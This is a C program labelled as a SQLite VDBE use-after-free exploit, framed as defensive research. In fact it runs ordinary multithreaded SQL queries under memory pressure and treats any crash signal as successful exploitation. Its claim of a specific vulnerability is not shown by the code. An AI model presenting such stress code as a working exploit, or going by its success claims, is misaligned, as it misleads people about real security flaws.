/*
** SQLite3 VDBE Memory Use-After-Free Exploit
** Target: sqlite3VdbeMemMakeWriteable UAF vulnerability (vdbemem.c:283)
** 
** SECURITY NOTICE: This code is for defensive security research only.
** Do not use for malicious purposes.
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include "sqlite3.h"

#define VDBE_UAF_DB_PATH "./exploit/inputs/vdbe_uaf.db"
#define UAF_ITERATIONS 10000
#define MEMORY_PRESSURE_SIZE 1000000
#define THREAD_COUNT 4

static volatile int uaf_detected = 0;
static volatile int exploit_running = 1;

/*
** Signal handler for detecting crashes
*/
void crash_handler(int sig) {
    printf("[!] CRASH DETECTED: Signal %d received\n", sig);
    printf("[!] Potential UAF exploitation succeeded\n");
    uaf_detected = 1;
    exploit_running = 0;
    exit(1);
}

/*
** Memory pressure thread to trigger reallocation scenarios
*/
void* memory_pressure_thread(void* arg) {
    while (exploit_running) {
        /* Allocate and free large blocks to fragment memory */
        for (int i = 0; i < 100 && exploit_running; i++) {
            void* ptr = malloc(MEMORY_PRESSURE_SIZE);
            if (ptr) {
                memset(ptr, 0xAA, MEMORY_PRESSURE_SIZE);
                usleep(1000);  /* 1ms delay */
                free(ptr);
            }
        }
        usleep(10000);  /* 10ms between cycles */
    }
    return NULL;
}

/*
** Create database for VDBE UAF testing
*/
int create_vdbe_uaf_database(const char* db_path) {
    sqlite3 *db;
    char *error_msg = 0;
    int rc;
    
    printf("[+] Creating VDBE UAF test database: %s\n", db_path);
    
    /* Create directory if needed */
    system("mkdir -p ./exploit/inputs/");
    
    rc = sqlite3_open(db_path, &db);
    if (rc != SQLITE_OK) {
        printf("[-] Cannot create database: %s\n", sqlite3_errmsg(db));
        return -1;
    }
    
    /* Create table with BLOB data to trigger memory operations */
    const char* create_sql = 
        "CREATE TABLE uaf_test ("
        "id INTEGER PRIMARY KEY, "
        "blob_data BLOB, "
        "text_data TEXT"
        ");";
    
    rc = sqlite3_exec(db, create_sql, 0, 0, &error_msg);
    if (rc != SQLITE_OK) {
        printf("[-] Table creation failed: %s\n", error_msg);
        sqlite3_free(error_msg);
        sqlite3_close(db);
        return -1;
    }
    
    /* Insert initial data to set up memory structures */
    for (int i = 0; i < 100; i++) {
        char insert_sql[2048];
        snprintf(insert_sql, sizeof(insert_sql),
            "INSERT INTO uaf_test (blob_data, text_data) VALUES "
            "(randomblob(%d), '%0*d');",
            1000 + (i * 100), 500, i);
        
        rc = sqlite3_exec(db, insert_sql, 0, 0, &error_msg);
        if (rc != SQLITE_OK) {
            printf("[-] Insert failed: %s\n", error_msg);
            sqlite3_free(error_msg);
            break;
        }
    }
    
    sqlite3_close(db);
    printf("[+] VDBE UAF test database created\n");
    return 0;
}

/*
** Execute UAF-triggering SQL operations
*/
int execute_uaf_sql_operations(sqlite3* db) {
    sqlite3_stmt* stmt;
    int rc;
    
    /* Prepare statement that will cause VDBE memory operations */
    const char* uaf_sql = 
        "SELECT "
        "    id, "
        "    substr(blob_data, 1, 1000) || substr(blob_data, 500, 1000) as combined_blob, "
        "    text_data || text_data || text_data as repeated_text, "
        "    length(blob_data) + length(text_data) as total_length "
        "FROM uaf_test "
        "WHERE length(blob_data) > ? "
        "ORDER BY total_length DESC "
        "LIMIT 50;";
    
    rc = sqlite3_prepare_v2(db, uaf_sql, -1, &stmt, NULL);
    if (rc != SQLITE_OK) {
        printf("[-] Prepare failed: %s\n", sqlite3_errmsg(db));
        return -1;
    }
    
    /* Execute with different parameter values to trigger reallocation */
    for (int param = 500; param < 2000 && exploit_running; param += 100) {
        sqlite3_bind_int(stmt, 1, param);
        
        while ((rc = sqlite3_step(stmt)) == SQLITE_ROW && exploit_running) {
            /* Force memory operations by accessing large data */
            const void* blob = sqlite3_column_blob(stmt, 1);
            const char* text = (const char*)sqlite3_column_text(stmt, 2);
            int blob_len = sqlite3_column_bytes(stmt, 1);
            int text_len = sqlite3_column_bytes(stmt, 2);
            
            if (blob && text && blob_len > 0 && text_len > 0) {
                /* Trigger memory copying and potential reallocation */
                char* temp_buffer = malloc(blob_len + text_len + 1000);
                if (temp_buffer) {
                    memcpy(temp_buffer, blob, blob_len);
                    strncpy(temp_buffer + blob_len, text, text_len);
                    free(temp_buffer);
                }
            }
        }
        
        sqlite3_reset(stmt);
        
        /* Add small delay to allow memory pressure thread to work */
        usleep(1000);
    }
    
    sqlite3_finalize(stmt);
    return 0;
}

/*
** UAF exploitation thread
*/
void* uaf_exploitation_thread(void* arg) {
    sqlite3* db;
    int thread_id = *(int*)arg;
    int rc;
    
    printf("[+] UAF thread %d starting\n", thread_id);
    
    rc = sqlite3_open(VDBE_UAF_DB_PATH, &db);
    if (rc != SQLITE_OK) {
        printf("[-] Thread %d: Cannot open database\n", thread_id);
        return NULL;
    }
    
    /* Execute UAF-triggering operations */
    for (int iteration = 0; iteration < UAF_ITERATIONS && exploit_running; iteration++) {
        if (execute_uaf_sql_operations(db) != 0) {
            break;
        }
        
        if (iteration % 1000 == 0) {
            printf("[+] Thread %d: Iteration %d, searching for UAF...\n", 
                   thread_id, iteration);
        }
        
        /* Periodically update data to trigger more memory operations */
        if (iteration % 100 == 0) {
            char update_sql[1024];
            snprintf(update_sql, sizeof(update_sql),
                "UPDATE uaf_test SET blob_data = randomblob(%d) WHERE id = %d;",
                2000 + (iteration % 1000), (iteration % 100) + 1);
            
            char* error_msg = 0;
            rc = sqlite3_exec(db, update_sql, 0, 0, &error_msg);
            if (rc != SQLITE_OK && error_msg) {
                sqlite3_free(error_msg);
            }
        }
    }
    
    sqlite3_close(db);
    printf("[+] UAF thread %d completed\n", thread_id);
    return NULL;
}

/*
** Execute VDBE UAF exploit
*/
int execute_vdbe_uaf_exploit() {
    pthread_t threads[THREAD_COUNT];
    pthread_t memory_thread;
    int thread_ids[THREAD_COUNT];
    
    printf("[+] Starting VDBE UAF exploitation with %d threads\n", THREAD_COUNT);
    
    /* Install crash handler */
    signal(SIGSEGV, crash_handler);
    signal(SIGABRT, crash_handler);
    signal(SIGBUS, crash_handler);
    
    /* Start memory pressure thread */
    if (pthread_create(&memory_thread, NULL, memory_pressure_thread, NULL) != 0) {
        printf("[-] Failed to create memory pressure thread\n");
        return -1;
    }
    
    /* Start UAF exploitation threads */
    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_ids[i] = i;
        if (pthread_create(&threads[i], NULL, uaf_exploitation_thread, &thread_ids[i]) != 0) {
            printf("[-] Failed to create UAF thread %d\n", i);
            return -1;
        }
    }
    
    /* Wait for threads to complete */
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    exploit_running = 0;
    pthread_join(memory_thread, NULL);
    
    if (uaf_detected) {
        printf("[!] UAF exploitation successful - crash detected\n");
        return 1;
    } else {
        printf("[+] UAF exploitation completed without crash\n");
        printf("[+] This could mean: UAF not triggered, or system protections active\n");
        return 0;
    }
}

/*
** Check for UAF indicators
*/
void check_uaf_indicators() {
    printf("\n[+] Checking for UAF indicators...\n");
    
    /* Check for core dumps */
    if (access("core", F_OK) == 0) {
        printf("[!] Core dump detected - potential UAF crash\n");
    }
    
    /* Check memory usage patterns */
    printf("[+] Current memory usage:\n");
    system("ps aux | grep -E '(PID|sqlite|vdbe_uaf)' | head -10");
    
    /* Check for address sanitizer output if available */
    if (getenv("ASAN_OPTIONS")) {
        printf("[+] AddressSanitizer enabled - check output for UAF detection\n");
    }
    
    printf("[+] UAF indicator check completed\n");
}

int main(int argc, char** argv) {
    printf("=== SQLite3 VDBE Memory Use-After-Free Exploit ===\n");
    printf("Target: sqlite3VdbeMemMakeWriteable UAF (vdbemem.c:283)\n");
    printf("WARNING: For defensive security research only!\n\n");
    
    /* Create test database */
    if (create_vdbe_uaf_database(VDBE_UAF_DB_PATH) != 0) {
        return 1;
    }
    
    /* Execute UAF exploit */
    printf("[+] Starting UAF exploitation attempt...\n");
    int result = execute_vdbe_uaf_exploit();
    
    /* Check for UAF indicators */
    check_uaf_indicators();
    
    printf("\n[+] VDBE UAF exploit test completed\n");
    printf("[+] Result: %s\n", result ? "UAF detected" : "No UAF detected");
    return 0;
}